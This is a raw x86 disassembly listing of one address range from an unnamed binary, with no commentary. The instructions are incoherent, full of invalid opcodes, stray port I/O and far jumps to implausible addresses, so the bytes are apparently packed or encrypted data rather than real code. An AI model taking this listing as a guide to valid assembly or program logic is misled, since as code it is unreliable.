  416786:	je     0x416771
	...
  41679c:	imul   edx,DWORD PTR [ebp+0x66],0x7d
  4167a0:	xchg   DWORD PTR [ebx],esp
  4167a2:	jb     0x416728
  4167a4:	push   esi
  4167a5:	inc    ecx
  4167a6:	jb     0x416818
  4167a8:	cdq    
  4167a9:	dec    esi
  4167aa:	pop    esp
  4167ab:	xchg   esi,eax
  4167ac:	cdq    
  4167ad:	pop    esi
  4167ae:	push   ecx
  4167af:	push   eax
  4167b0:	mov    DWORD PTR [edi+0x50],ebx
  4167b3:	push   esp
  4167b4:	pop    ebx
  4167b5:	push   esp
  4167b6:	addr16 pop edx
  4167b8:	test   DWORD PTR [edi+0x72],ebx
  4167bb:	jmp    0xa8a5d6
  4167c0:	adc    al,0x7
  4167c2:	outs   dx,BYTE PTR gs:[esi]
  4167c4:	jne    0x4167fa
  4167c6:	add    BYTE PTR [edx+0x79],ah
  4167c9:	xor    BYTE PTR [edi+0x69],ah
  4167cc:	(bad)  
  4167cd:	pusha  
  4167ce:	js     0x4167fe
  4167d0:	inc    esp
  4167d1:	das    
  4167d2:	add    BYTE PTR [eax+0x3f],cl
  4167d5:	das    
  4167d6:	je     0x416846
  4167d8:	xor    DWORD PTR [ecx],ebp
  4167da:	popa   
  4167db:	add    BYTE PTR [ebp+0x2f],ah
  4167de:	popa   
  4167df:	jb     0x41680f
  4167e1:	pop    ebp
  4167e2:	imul   esp,DWORD PTR [ebp-0x60],0x83735d0e
  4167e9:	xor    DWORD PTR [ebx+0x72],ebp
  4167ec:	xor    al,0xfc
  4167ee:	dec    edi
  4167ef:	outs   dx,DWORD PTR ds:[esi]
  4167f0:	xchg   edx,eax
  4167f1:	xor    al,BYTE PTR [eax]
  4167f3:	push   ebx
  4167f4:	jg     0x41681a
  4167f6:	je     0x41686f
  4167f8:	jno    0x41682a
  4167fa:	popa   
  4167fb:	pop    esp
  4167fc:	xchg   ebp,eax
  4167fd:	ss jo  0x416861
	...
  416814:	outs   dx,BYTE PTR ds:[esi]
  416815:	add    dh,BYTE PTR [edx+0x69]
  416818:	xchg   BYTE PTR [edi+0x5c],bl
  41681b:	push   ebx
  41681c:	jne    0x41684b
  41681e:	outs   dx,DWORD PTR ds:[esi]
  41681f:	imul   edi,DWORD PTR [edi+0x2c],0x40fc006f
  416826:	js     0x416898
  416828:	shr    DWORD PTR [ebx],0x44
  41682b:	jb     0x4167e6
  41682d:	xor    esp,DWORD PTR [ecx+0x0]
  416830:	int3   
  416831:	and    DWORD PTR [edx+0x69],esi
  416834:	xchg   esi,eax
  416835:	pusha  
  416836:	outs   dx,DWORD PTR ds:[esi]
  416837:	cs stos BYTE PTR es:[edi],al
  416839:	add    BYTE PTR cs:[edx],ah
  41683c:	sbb    BYTE PTR [edi+ebp*2+0x73],0x87
  416841:	sub    dh,BYTE PTR [edx+0x64]
  416844:	inc    edx
  416845:	sbb    al,0x3a
  416847:	and    BYTE PTR [edx-0x4],al
  41684a:	and    DWORD PTR [ecx+edi*1],ebp
  41684d:	xlat   BYTE PTR ds:[ebx]
  41684e:	xor    BYTE PTR [ebp+0x57],ch
  416851:	sub    ecx,DWORD PTR [ebx+0x5f]
  416854:	dec    ebx
  416855:	xor    al,0x28
  416857:	inc    ebx
  416858:	push   ecx
  416859:	pop    es
  41685a:	popa   
  41685b:	outs   dx,BYTE PTR ds:[esi]
  41685c:	jge    0x416863
  41685e:	pop    ecx
  41685f:	jbe    0x4168b5
  416861:	xlat   BYTE PTR ds:[ebx]
  416862:	ds js  0x41688e
  416865:	clc    
  416866:	push   ebp
  416867:	inc    esp
  416868:	sub    esi,eax
  41686a:	dec    ebp
  41686b:	arpl   WORD PTR [esi],ax
  41686d:	pop    ds
  41686e:	push   ebx
  41686f:	imul   edx,DWORD PTR [edi+edx*8],0x30
  416873:	arpl   WORD PTR [ebx],cx
  416875:	rcr    DWORD PTR [esi+0x72],0x0
	...
  416889:	add    BYTE PTR [eax],al
  41688b:	add    BYTE PTR [ecx],bh
  41688d:	in     al,dx
  41688e:	dec    esi
  41688f:	arpl   WORD PTR [ebx],cx
  416891:	sbb    DWORD PTR [ecx+0x6b],esp
  416894:	adc    al,0xd7
  416896:	xor    DWORD PTR [edi-0x16],ebx
  416899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41689a:	dec    esp
  41689b:	ins    DWORD PTR es:[edi],dx
  41689c:	jmp    0x416858
  41689e:	add    DWORD PTR [ebp+0x9],ebx
  4168a1:	mov    eax,0x81e67150
  4168a6:	dec    edi
  4168a7:	cmp    DWORD PTR fs:[ebx-0x4a2b8da6],edx
  4168ae:	dec    ebp
  4168af:	ins    DWORD PTR es:[edi],dx
  4168b0:	retf   
  4168b1:	pop    DWORD PTR [ecx]
  4168b3:	push   ecx
  4168b4:	into   
  4168b5:	mov    eax,0x6598754d
  4168ba:	pop    esi
  4168bb:	pop    esp
  4168bc:	jg     0x416854
  4168be:	cmp    DWORD PTR [eax],esp
  4168c0:	mov    bh,BYTE PTR [edx+0x5b]
  4168c3:	je     0x41686b
  4168c5:	js     0x416916
  4168c7:	arpl   WORD PTR [ebp-0x6a],si
  4168ca:	push   ebp
  4168cb:	pop    edi
  4168cc:	mov    al,BYTE PTR [esi+0x5a]
  4168cf:	popa   
  4168d0:	jg     0x416935
  4168d2:	xor    DWORD PTR [edi+esi*2+0x6b],ebx
  4168d6:	xor    DWORD PTR [edi],edi
  4168d8:	pop    edx
  4168d9:	add    BYTE PTR [edx+0x55],cl
  4168dc:	push   0x52
  4168de:	push   ebx
  4168df:	push   ecx
  4168e0:	cmp    DWORD PTR [edx],edi
  4168e2:	pop    ebx
  4168e3:	push   esp
  4168e4:	mov    BYTE PTR [ebx+0x59],bl
  4168e7:	dec    esi
  4168e8:	pop    edx
  4168e9:	dec    esi
  4168ea:	out    0x3d,eax
  4168ec:	inc    ebp
  4168ed:	push   eax
  4168ee:	adc    al,0x51
	...
  416904:	pop    edx
  416905:	dec    esi
  416906:	and    eax,0xe75b5263
  41690b:	cmp    eax,0x6337502d
  416910:	sub    BYTE PTR [ebp+0x16],cl
  416913:	push   ebp
  416914:	sub    ebx,DWORD PTR [edi+eiz*8+0x24]
  416918:	test   DWORD PTR [ebx+0x17],0xfa4cf634
  41691f:	dec    esp
  416920:	sbb    al,0x4e
  416922:	add    eax,DWORD PTR [edi+edi*8]
  416925:	dec    ebx
  416926:	idiv   DWORD PTR [edi]
  416928:	push   ss
  416929:	dec    esi
  41692a:	add    al,0x61
  41692c:	in     eax,dx
  41692d:	push   eax
  41692e:	(bad)  [edx+0x39]
  416931:	sub    eax,0x290d3dae
  416936:	test   al,0x31
  416938:	cli    
  416939:	and    ebx,DWORD PTR [ebp-0x65dffec0]
  41693f:	push   esp
  416940:	xlat   BYTE PTR ds:[ebx]
  416941:	dec    ebx
  416942:	mov    dh,0x62
  416944:	retf   
  416945:	pop    edx
  416946:	xchg   ebx,eax
  416947:	cmp    eax,0x5cbd56cd
  41694c:	xchg   ebp,eax
  41694d:	inc    ecx
  41694e:	mov    ah,BYTE PTR [eax-0x64]
  416951:	xor    eax,0xa84f8d
  416956:	mov    edx,0x96349754
  41695b:	bound  ecx,QWORD PTR [ebx+0x653da325]
  416961:	push   eax
  416962:	stos   BYTE PTR es:[edi],al
  416963:	push   edi
  416964:	sahf   
  416965:	and    eax,0x8700
	...
  41697a:	add    BYTE PTR [eax],al
  41697c:	outs   dx,BYTE PTR ds:[esi]
  41697d:	pop    esp
  41697e:	push   ecx
  41697f:	add    BYTE PTR [esi-0x78168edd],0x2d
  416986:	push   bp
  416988:	and    bl,BYTE PTR [edi+0x72]
  41698b:	dec    esp
  41698c:	pop    ecx
  41698d:	push   ecx
  41698e:	ins    DWORD PTR es:[edi],dx
  41698f:	inc    edi
  416990:	adc    DWORD PTR [eax+0x2e],ebx
  416993:	push   esi
  416994:	pop    es
  416995:	and    eax,0x5061275c
  41699a:	inc    ecx
  41699b:	inc    ebp
  41699c:	or     al,0x23
  41699e:	outs   dx,BYTE PTR ds:[esi]
  41699f:	xor    eax,0x1d675119
  4169a4:	pusha  
  4169a5:	xor    DWORD PTR [eax],eax
  4169a7:	iret   
  4169a8:	imul   edi,DWORD PTR [eax],0x61
  4169ab:	jmp    0xfdad9658
  4169b0:	cmp    bl,BYTE PTR [ebp+eax*2+0x19]
  4169b4:	out    0x2c,al
  4169b6:	data16 cmc 
  4169b8:	inc    ebx
  4169b9:	pop    edi
  4169ba:	jb     0x4169c8
  4169bc:	sbb    DWORD PTR [edi+eiz*2-0x5],eax
  4169c0:	and    DWORD PTR [ecx],esp
  4169c2:	je     0x41699a
  4169c4:	and    al,0x37
  4169c6:	and    BYTE PTR [esi-0x168eccd6],ch
  4169cc:	(bad)  
  4169cd:	push   eax
  4169ce:	push   0x64230cc8
  4169d3:	call   0x2508:0xd0743421
  4169da:	jno    0x4169e3
  4169dc:	push   ss
  4169dd:	and    DWORD PTR [ecx-0x17],esi
	...
  4169f4:	xchg   esi,eax
  4169f5:	push   ecx
  4169f6:	push   0x64236488
  4169fb:	mov    edx,0x80743451
  416a00:	push   0xdae7125
  416a05:	pop    esp
  416a06:	xor    BYTE PTR [eax],al
  416a08:	xlat   BYTE PTR ds:[ebx]
  416a09:	mov    bh,0x2b
  416a0b:	arpl   WORD PTR [ebx-0x5ca4000b],si
  416a11:	jmp    0x654e:0xe6bd725c
  416a18:	mov    eax,?
  416a1a:	outs   dx,BYTE PTR fs:[esi]
  416a1c:	jg     0x416a15
  416a1e:	sub    eax,0x64f08173
  416a23:	je     0x416aa2
  416a25:	add    al,0x5c
  416a27:	push   ebx
  416a28:	push   0x7c6571e5
  416a2d:	push   edi
  416a2e:	popa   
  416a2f:	je     0x416a2d
  416a31:	in     al,dx
  416a32:	ins    DWORD PTR es:[edi],dx
  416a33:	addr16 jae 0x416a59
  416a36:	sub    eax,0x3121905f
  416a3b:	cs inc ebx
  416a3d:	cmc    
  416a3e:	imul   ebp,DWORD PTR [ecx+0x3c],0xffffffe9
  416a42:	call   FWORD PTR [ebx+0x63]
  416a45:	repz gs cmp ax,0x3ee9
  416a4b:	jne    0x4169cd
  416a4d:	mov    ds:0xf82e6f50,al
  416a52:	jb     0x416ab5
  416a54:	jb     0x416a3d
  416a56:	jmp    FWORD PTR [ebx+0x0]
	...
  416a69:	add    BYTE PTR [eax],al
  416a6b:	add    BYTE PTR [ebp-0x1d],bh
  416a6e:	outs   dx,DWORD PTR ds:[esi]
  416a6f:	mov    dx,?
  416a72:	push   DWORD PTR [esi+esi*2-0x12]
  416a76:	pusha  
  416a77:	popa   
  416a78:	jo     0x416a2a
  416a7a:	bound  edi,QWORD PTR [eax+0x7d]
  416a7d:	add    ch,BYTE PTR [edi+0x69]
  416a80:	mov    edi,fs
  416a82:	outs   dx,BYTE PTR ds:[esi]
  416a83:	cs ins BYTE PTR es:[edi],dx
  416a85:	jecxz  0x416afa
  416a87:	add    bl,dh
  416a89:	in     al,dx
  416a8a:	jae    0x416af1
  416a8c:	shr    DWORD PTR [edi+0x1c96e66],cl
  416a92:	pop    esp
  416a93:	dec    esp
  416a94:	cmp    DWORD PTR [esp+0x33886e70],ecx
  416a9b:	arpl   WORD PTR [ebp+0x73],bp
  416a9e:	sub    BYTE PTR [edi-0x77],bl
  416aa1:	gs push ebp
  416aa3:	push   eax
  416aa4:	cmp    DWORD PTR [edx-0x6972b9ae],ebx
  416aaa:	inc    esp
  416aab:	push   edx
  416aac:	je     0x416af1
  416aae:	push   eax
  416aaf:	arpl   WORD PTR [eax+0x57],bx
  416ab2:	push   edi
  416ab3:	pop    edi
  416ab4:	imul   ecx,DWORD PTR [esp+eax*1+0x47],0x67
  416ab9:	pop    edx
  416aba:	cmp    BYTE PTR [edi+0x5d],bl
  416abd:	push   ebx
  416abe:	push   esp
  416abf:	pop    edi
  416ac0:	dec    ebp
  416ac1:	dec    edi
  416ac2:	add    al,0x44
  416ac4:	pop    eax
  416ac5:	sti    
  416ac6:	and    BYTE PTR [eax+eiz*1-0x7],al
  416aca:	add    edx,DWORD PTR [eax+0x18]
  416acd:	sbb    dh,BYTE PTR [ebx]
  416acf:	jne    0x416ad1
	...
  416ae1:	add    BYTE PTR [eax],al
  416ae3:	add    BYTE PTR [esi],dl
  416ae5:	sbb    DWORD PTR [eax],ebp
  416ae7:	add    cl,dh
  416ae9:	add    eax,0x8077433
  416aee:	sub    eax,0x331c3963
  416af3:	arpl   WORD PTR [ebx],cx
  416af5:	in     eax,dx
  416af6:	and    BYTE PTR [ebx+0x14],ch
  416af9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416afa:	push   ebx
  416afb:	arpl   sp,sp
  416afd:	mov    ebp,0xcff56335
  416b02:	xor    esp,DWORD PTR [ebx-0x26]
  416b05:	shl    BYTE PTR [eax],cl
  416b07:	jb     0x416ae9
  416b09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b0a:	push   ecx
  416b0b:	ins    DWORD PTR es:[edi],dx
  416b0c:	retf   
  416b0d:	ror    BYTE PTR [edi+0x73],cl
  416b10:	fmul   st(0),st
  416b12:	es jb  0x416b4e
  416b15:	gs push esp
  416b17:	push   eax
  416b18:	retf   
  416b19:	lds    esi,FWORD PTR ds:0x2d7e9a6d
  416b1f:	add    BYTE PTR [edx-0x52d66a00],cl
  416b25:	xor    eax,0x5c9a3588
  416b2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b2b:	and    cl,BYTE PTR [ebx+0x59318034]
  416b31:	push   eax
  416b32:	jns    0x416b5e
  416b34:	nop
  416b35:	xor    al,BYTE PTR [eax-0x45a3c6d1]
  416b3b:	cmc    
  416b3c:	js     0x416b65
  416b3e:	jae    0x416b89
  416b40:	xor    BYTE PTR gs:0xe727572b,dl
  416b47:	push   ecx
	...
  416b5c:	jne    0x416baf
  416b5e:	inc    eax
  416b5f:	cmp    BYTE PTR [edx+0x31],bl
  416b62:	std    
  416b63:	sub    bl,BYTE PTR [edi+0x27]
  416b66:	out    0x5f,eax
  416b68:	ja     0x416b8d
  416b6a:	xor    ecx,DWORD PTR [eax+0x4b]
  416b6d:	daa    
  416b6e:	cmp    eax,0x48503927
  416b73:	xor    eax,0x36165528
  416b78:	sbb    eax,0xd363400
  416b7d:	add    BYTE PTR [esi*1+0x231d321a],bh
  416b84:	and    ah,BYTE PTR [ebx]
  416b86:	out    0x55,eax
  416b88:	adc    al,0x2d
  416b8a:	repz inc edi
  416b8c:	push   ss
  416b8d:	xor    cl,BYTE PTR [eiz*1+0x3af92ced]
  416b94:	cmp    DWORD PTR [eax-0x2a],edx
  416b97:	xor    eax,0x30b9ffed
  416b9c:	xlat   BYTE PTR ds:[ebx]
  416b9d:	xor    ebx,esi
  416b9f:	and    cl,bl
  416ba1:	and    ch,BYTE PTR [ebx-0x44cd23ac]
  416ba7:	sub    ebx,DWORD PTR [ecx]
  416ba9:	push   edx
  416baa:	sar    BYTE PTR [ecx],1
  416bac:	fidiv  DWORD PTR [ecx]
  416bae:	add    BYTE PTR [ecx],cl
  416bb0:	xchg   ecx,eax
  416bb1:	pop    ds
  416bb2:	popa   
  416bb3:	shr    DWORD PTR [eax+0x2d],0x6c
  416bb7:	xchg   esi,eax
  416bb8:	push   ecx
  416bb9:	and    esp,DWORD PTR [ebx-0x66]
  416bbc:	jle    0x416c13
  416bbe:	arpl   WORD PTR [ebx+0x0],cx
	...
  416bd4:	jle    0x416c04
  416bd6:	addr16 xchg edi,eax
  416bd8:	push   edi
  416bd9:	pop    esp
  416bda:	inc    ecx
  416bdb:	xchg   esi,eax
  416bdc:	dec    eax
  416bdd:	sub    ah,BYTE PTR [ebx-0x76]
  416be0:	inc    esi
  416be1:	and    ebp,DWORD PTR [ebp-0x79]
  416be4:	sub    eax,0x24845100
  416be9:	xor    ah,BYTE PTR [ebx+0x5b]
  416bec:	xor    DWORD PTR [ebx],0x42354470
  416bf2:	push   esp
  416bf3:	cmp    ebp,ebx
  416bf5:	inc    eax
  416bf6:	dec    ebp
  416bf7:	pop    ds
  416bf8:	jno    0x416c48
  416bfa:	dec    ebp
  416bfb:	xor    eax,0x1954423d
  416c00:	jp     0x416c4f
  416c02:	dec    esi
  416c03:	jmp    0x47b397ac
  416c08:	xor    eax,0x561b505c
  416c0d:	and    ah,BYTE PTR [edi+0xd]
  416c10:	push   eax
  416c11:	xor    DWORD PTR [eax],eax
  416c13:	push   0xfffffff8
  416c15:	mov    ebx,0xa80a5f0d
  416c1a:	addr16 cli 
  416c1c:	pop    ss
  416c1d:	mov    ebp,0x3046f568
  416c22:	cmp    al,dh
  416c24:	addr16 mov ebx,0x3026f565
  416c2a:	jno    0x416c4f
  416c2c:	push   esi
  416c2d:	in     al,dx
  416c2e:	inc    esi
  416c30:	xor    BYTE PTR es:[edx],bh
  416c33:	push   es
  416c34:	mov    bx,0xd96e
	...
  416c4c:	and    DWORD PTR [esi],ebp
  416c4e:	pop    edi
  416c4f:	add    BYTE PTR [eax-0xe],dl
  416c52:	pop    esp
  416c53:	outs   dx,BYTE PTR ds:[esi]
  416c54:	je     0x416c03
  416c56:	popa   
  416c57:	popa   
  416c58:	hlt    
  416c59:	(bad)  
  416c5a:	pop    edx
  416c5b:	push   ebx
  416c5c:	out    dx,eax
  416c5d:	in     al,0x73
  416c5f:	ja     0x416c12
  416c61:	lock pusha 
  416c63:	pop    esp
  416c64:	iret   
  416c65:	out    dx,al
  416c66:	pusha  
  416c67:	jb     0x416c2a
  416c69:	sahf   
  416c6a:	push   eax
  416c6b:	outs   dx,DWORD PTR ds:[esi]
  416c6c:	mov    dh,0xf2
  416c6e:	jb     0x416cd1
  416c70:	sub    al,0xff
  416c73:	dec    ebx
  416c74:	mov    cl,0xed
  416c76:	jae    0x416c98
  416c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c79:	jmp    0x416cec
  416c7b:	gs ret 
  416c7d:	repnz push 0x72
  416c80:	pop    ecx
  416c81:	scas   eax,DWORD PTR es:[edi]
  416c82:	std    
  416c83:	dec    ebx
  416c84:	jno    0x416c75
  416c86:	jae    0x416ca8
  416c88:	sbb    edx,ebp
  416c8a:	outs   dx,BYTE PTR ds:[esi]
  416c8b:	je     0x416c0e
  416c8d:	lock imul esp,DWORD PTR [eax],0x20
  416c91:	in     eax,0x73
  416c93:	push   0x657049d0
  416c98:	jb     0x416c7f
  416c9a:	sub    eax,0x4c514448
  416c9f:	pop    esp
  416ca0:	inc    ebx
  416ca1:	in     al,dx
  416ca2:	pusha  
  416ca3:	ins    BYTE PTR es:[edi],dx
  416ca4:	sub    al,0x20
  416ca6:	imul   esi,DWORD PTR [eax+0x45],0xffffffea
  416caa:	pop    ebx
  416cab:	arpl   WORD PTR [edi+0x6168ef],cx
	...
  416cc1:	add    BYTE PTR [eax],al
  416cc3:	add    BYTE PTR [esi],ch
  416cc5:	call   0xef6ae3c9
  416cca:	pusha  
  416ccb:	data16 je 0x416cbc
  416cce:	outs   dx,BYTE PTR ds:[esi]
  416ccf:	jb     0x416d37
  416cd1:	in     eax,dx
  416cd2:	sub    eax,0xffec8962
  416cd7:	pop    ebx
  416cd8:	xchg   ecx,eax
  416cd9:	frstor [eax+0x42]
  416cdc:	cmp    DWORD PTR [eax+0x55],esp
  416cdf:	add    dl,ch
  416ce1:	jns    0x416d06
  416ce3:	je     0x416cb3
  416ce5:	(bad)  
  416ce6:	das    
  416ce7:	arpl   bp,bx
  416ce9:	and    ah,BYTE PTR [bp+di+0x7b]
  416ced:	pusha  
  416cee:	push   ebp
  416cef:	add    BYTE PTR [ebp+edx*4+0x58],bh
  416cf3:	add    BYTE PTR [edx-0x79abbc8e],cl
  416cf9:	push   0x6675434f
  416cfe:	sub    eax,0x28968a5f
  416d03:	jno    0x416d6a
  416d05:	fwait
  416d06:	cmp    al,0x70
  416d08:	xchg   esp,eax
  416d09:	imul   ebp,DWORD PTR [edx+eiz*2],0xffffff95
  416d0d:	cs inc edx
  416d0f:	inc    edx
  416d10:	sub    BYTE PTR [ecx-0x11],ah
  416d13:	inc    eax
  416d14:	sub    ecx,ebp
  416d16:	in     al,dx
  416d17:	aaa    
  416d18:	sub    eax,esp
  416d1a:	imul   DWORD PTR [edx]
  416d1c:	or     eax,0x1c4140e8
  416d21:	in     eax,0x3e
  416d23:	inc    esi
  416d24:	or     al,0x14
  416d26:	clc    
  416d27:	add    BYTE PTR cs:[eax],al
	...
  416d3a:	add    BYTE PTR [eax],al
  416d3c:	js     0x416cef
  416d3e:	cmc    
  416d3f:	inc    edx
  416d40:	imul   edi,DWORD PTR [edx-0x4d99cabd],0x3e
  416d47:	add    BYTE PTR [edx],cl
  416d49:	repnz inc ebp
  416d4b:	push   esp
  416d4c:	push   es
  416d4d:	call   0xe636b0a3
  416d52:	das    
  416d53:	pop    edi
  416d54:	or     dl,BYTE PTR [esi]
  416d56:	and    eax,0x391ae571
  416d5b:	jo     0x416d71
  416d5d:	jmp    0x416d87
  416d5f:	bound  edx,QWORD PTR ds:0xf842faae
  416d65:	jae    0x416d5d
  416d67:	xor    ch,BYTE PTR [ebx]
  416d69:	add    BYTE PTR [eax],ah
  416d6b:	out    dx,eax
  416d6c:	sti    
  416d6d:	out    dx,al
  416d6e:	sbb    dl,dh
  416d70:	and    esi,esp
  416d72:	sbb    eax,0xa8eb05f7
  416d77:	inc    eax
  416d78:	or     al,0xf7
  416d7a:	adc    eax,DWORD PTR [edi+0x5]
  416d7d:	clc    
  416d7e:	clc    
  416d7f:	idiv   BYTE PTR [eax+edi*8-0xa]
  416d83:	hlt    
  416d84:	imul   ebp,esi,0x31393ea9
  416d8a:	nop
  416d8b:	xor    BYTE PTR [edx-0x77cc6cde],bl
  416d91:	cs popf 
  416d93:	xor    BYTE PTR [edi+0x27],bl
  416d96:	jge    0x416dc2
  416d98:	cmp    DWORD PTR [ecx],esi
  416d9a:	nop
  416d9b:	xor    BYTE PTR [edx+0x337322],bl
	...
  416db1:	add    BYTE PTR [eax],al
  416db3:	add    BYTE PTR [edi],ah
  416db5:	daa    
  416db6:	test   DWORD PTR [edx],ebp
  416db8:	cmp    DWORD PTR [edx-0x6d],eax
  416dbb:	push   ebx
  416dbc:	(bad)
  416dc0:	push   esp
  416dc1:	and    ebx,DWORD PTR [ecx-0x12]
  416dc4:	pop    esp
  416dc5:	xor    al,0x57
  416dc7:	add    al,0x77
  416dc9:	push   esp
  416dca:	aaa    
  416dcb:	push   esi
  416dcc:	push   esp
  416dcd:	aaa    
  416dce:	dec    eax
  416dcf:	and    eax,0x330d2e5a
  416dd4:	sbb    BYTE PTR [eax],al
  416dd6:	adc    edx,DWORD PTR [edx+0x21]
  416dd9:	daa    
  416dda:	cmp    eax,0xd29082d
  416ddf:	cmp    BYTE PTR [edi+0x1d],cl
  416de2:	push   cs
  416de3:	das    
  416de4:	cmp    DWORD PTR [edx],ebp
  416de6:	sbb    dh,BYTE PTR [ecx]
  416de8:	dec    eax
  416de9:	jmp    0x5135:0x153002
  416df0:	call   0xde6f9e4d
  416df5:	xor    eax,DWORD PTR [eax]
  416df7:	jmp    0xe92bcf8
  416dfc:	or     BYTE PTR [eax],ch
  416dfe:	jae    0x416ddd
  416e00:	push   ss
  416e01:	sub    esi,DWORD PTR [ebp-0x31]
  416e04:	cmp    cl,BYTE PTR [edx+0x51]
  416e07:	mov    edx,0xc47158f8
  416e0c:	dec    esp
  416e0d:	in     al,dx
  416e0e:	pop    esp
  416e0f:	lods   eax,DWORD PTR ds:[esi]
  416e10:	pop    ss
  416e11:	pop    ds
  416e12:	ins    DWORD PTR es:[edi],dx
  416e13:	lds    ebx,FWORD PTR [edi+0x42]
  416e16:	jae    0x416de7
	...
  416e2c:	push   esp
  416e2d:	and    esi,DWORD PTR [edx-0x17]
  416e30:	mov    DWORD PTR [ebx+0x41],eax
  416e33:	mov    al,0x86
  416e35:	inc    ebx
  416e36:	dec    ebx
  416e37:	mov    esi,0x8c63327c
  416e3c:	sub    DWORD PTR [ebx+eiz*2],0x7c
  416e40:	cmp    dl,BYTE PTR [eax+0x49]
  416e43:	mov    eax,0x8445550b
  416e48:	cs aas 
  416e4a:	outs   dx,BYTE PTR ds:[esi]
  416e4b:	jge    0x416e64
  416e4d:	xor    ch,BYTE PTR [esi-0x78]
  416e50:	push   ss
  416e51:	dec    ecx
  416e52:	arpl   WORD PTR [eax-0x7a],sp
  416e55:	and    al,0x6d
  416e57:	push   ebp
  416e58:	cmp    eax,0xc4184950
  416e5d:	push   esp
  416e5e:	aas    
  416e5f:	push   esp
  416e60:	or     DWORD PTR [eax],ebp
  416e62:	arpl   WORD PTR [edi+0x9],dx
  416e65:	pop    ds
  416e66:	popa   
  416e67:	dec    eax
  416e68:	imul   esp,DWORD PTR [ebx],0xe6fe1900
  416e6e:	cs sbb bh,cl
  416e71:	push   ecx
  416e72:	pop    ebp
  416e73:	sub    eax,0x20722158
  416e78:	dec    ebp
  416e79:	sub    al,0x0
  416e7b:	cmp    esi,edi
  416e7d:	out    0x2e,al
  416e7f:	cs sti 
  416e81:	xor    DWORD PTR [ebx+0x0],esp
  416e84:	sub    eax,0x6c6f6c4f
  416e89:	add    eax,DWORD PTR [eax]
  416e8b:	add    BYTE PTR [eax+0x3],ah
	...
  416ea2:	add    BYTE PTR [eax],al
  416ea4:	push   eax
  416ea5:	add    eax,DWORD PTR [eax]
  416ea7:	add    BYTE PTR [eax+0x3],dl
  416eaa:	add    BYTE PTR [eax],al
  416eac:	pusha  
  416ead:	add    eax,DWORD PTR [eax]
  416eaf:	add    BYTE PTR [eax+0x3],ah
  416eb2:	add    BYTE PTR [eax],al
  416eb4:	push   eax
  416eb5:	add    eax,DWORD PTR [eax]
  416eb7:	add    BYTE PTR [eax+0x3],dl
  416eba:	add    BYTE PTR [eax],al
  416ebc:	and    BYTE PTR [ebx],al
  416ebe:	add    BYTE PTR [ebx-0xf],dh
  416ec1:	fisub  WORD PTR [esp+esi*2-0x3]
  416ec5:	lods   eax,DWORD PTR ds:[esi]
  416ec6:	sub    esp,DWORD PTR [esp+eax*8-0x22]
  416eca:	push   DWORD PTR [edx-0x4f]
  416ecd:	fisub  WORD PTR [esp+esi*2-0x43]
  416ed1:	lods   eax,DWORD PTR ds:[esi]
  416ed2:	pop    esp
  416ed3:	outs   dx,DWORD PTR ds:[esi]
  416ed4:	mov    al,ds:0x83006ddf
  416ed9:	in     al,dx
  416eda:	imul   ebp,DWORD PTR [ecx+0x6c],0xffffffe0
  416ede:	cs pop edi
  416ee0:	ret    
  416ee1:	fisubr WORD PTR [edx+0x73]
  416ee4:	mov    ebp,0x84716f02
  416ee9:	in     eax,0x73
  416eeb:	xor    ebx,DWORD PTR gs:[ebx+0x70]
  416eef:	jb     0x416f6e
  416ef1:	in     al,dx
  416ef2:	pop    esp
  416ef3:	jb     0x416f72
  416ef5:	cld    
  416ef6:	outs   dx,BYTE PTR ds:[esi]
  416ef7:	jno    0x416f5d
  416ef9:	in     eax,0x73
  416efb:	gs mov bl,0x59
  416efe:	outs   dx,DWORD PTR ds:[esi]
  416eff:	je     0x416efe
  416f01:	jmp    0x416f02
  416f03:	jb     0x416f66
  416f05:	call   0x41e36e
	...
  416f1a:	add    BYTE PTR [eax],al
  416f1c:	sub    eax,0x47635caf
  416f21:	call   0xff7adc96
  416f26:	pop    eax
  416f27:	bound  eax,QWORD PTR [eax]
  416f29:	or     eax,0xba39711f
  416f2e:	xor    al,0x6c
  416f30:	loopne 0x416ede
  416f32:	and    BYTE PTR [ecx],dh
  416f34:	push   cs
  416f35:	or     ch,BYTE PTR [ecx]
  416f37:	ins    BYTE PTR es:[edi],dx
  416f38:	in     al,dx
  416f39:	mov    bl,0x27
  416f3b:	pop    ebp
  416f3c:	fcmovne st,st(4)
  416f3e:	sub    ah,BYTE PTR [edx+0x39]
  416f41:	test   eax,0xd9d36d28
  416f46:	xor    al,0x6c
  416f48:	ror    ah,1
  416f4a:	and    BYTE PTR [ecx],dh
  416f4c:	pextrw esp,(bad),0xc5
  416f4e:	and    eax,0x347a396c
  416f53:	ins    BYTE PTR es:[edi],dx
  416f54:	mov    al,ds:0x86312073
  416f59:	jbe    0x416f8c
  416f5b:	arpl   WORD PTR [edi-0x5a90c959],cx
  416f61:	nop
  416f62:	sub    eax,0x266e4a63
  416f67:	ins    BYTE PTR es:[edi],dx
  416f68:	xchg   esi,eax
  416f69:	call   0x6725:0x388a0020
  416f70:	ins    DWORD PTR es:[edi],dx
  416f71:	jl     0x416f69
  416f73:	pop    esp
  416f74:	imul   edi,DWORD PTR [ecx],0x39587020
  416f7a:	and    BYTE PTR [eax],al
  416f7c:	push   0x58
  416f7e:	sub    BYTE PTR [edi+0x0],ah
	...
  416f91:	add    BYTE PTR [eax],al
  416f93:	add    BYTE PTR [ebp+0x3c],cl
  416f96:	repz pop esp
  416f98:	dec    edx
  416f99:	push   ebx
  416f9a:	sbb    eax,0x315a3970
  416f9f:	ins    BYTE PTR es:[edi],dx
  416fa0:	push   eax
  416fa1:	repz sbb al,0x31
  416fa4:	push   ss
  416fa5:	dec    edx
  416fa6:	daa    
  416fa7:	ins    BYTE PTR es:[edi],dx
  416fa8:	and    al,0x3c
  416faa:	sub    bl,BYTE PTR [ebp+0x1b]
  416fad:	lock das 
  416faf:	arpl   WORD PTR [edx],bp
  416fb1:	add    bh,ah
  416fb3:	xor    al,0x26
  416fb5:	and    al,0x10
  416fb7:	xor    BYTE PTR [edx],bl
  416fb9:	icebp  
  416fba:	xor    eax,0x14241425
  416fbf:	daa    
  416fc0:	andnps xmm1,XMMWORD PTR [ecx]
  416fc3:	sub    ah,ah
  416fc5:	and    edi,esp
  416fc7:	add    edi,DWORD PTR [ecx]
